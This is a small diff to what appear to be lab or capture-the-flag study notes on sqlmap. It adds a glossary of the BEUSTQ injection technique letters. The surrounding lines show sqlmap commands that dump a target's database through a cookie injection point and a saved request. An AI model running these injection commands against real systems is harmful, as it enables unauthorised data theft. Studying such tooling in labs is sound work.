@@ -56,6 +56,17 @@ sqlmap -u "http://94.237.62.6:47094/case3.php" --cookie='id=1*' --batch --dump
   </item>
 </items>
 ```
+```
+The technique characters BEUSTQ refers to the following:
+
+B: Boolean-based blind
+E: Error-based
+U: Union query-based
+S: Stacked queries
+T: Time-based blind
+Q: Inline queries
+
+```
 
 ```bash
 sqlmap -r case4.txt -p id --dump
